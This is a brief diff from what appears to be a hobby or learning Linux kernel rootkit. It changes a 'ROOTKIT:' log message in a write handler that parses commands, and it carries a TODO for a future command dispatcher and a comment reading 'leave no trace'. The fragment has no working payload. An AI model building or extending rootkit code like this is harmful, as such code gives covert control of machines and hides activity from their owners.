@@ -128,7 +128,7 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 		cmdPtr = &buff[3];			// cmdPtr should now be the given command
 
 		/* TODO: place our if/elseif strcmp tower here for future commands */
-		printk(KERN_INFO "ROOTKIT: You issued the command: %s\n", cmdPtr);
+		printk(KERN_INFO "ROOTKIT: You issued a command!\n");
 
 	}
 	kfree(privBuf);		// leave no trace
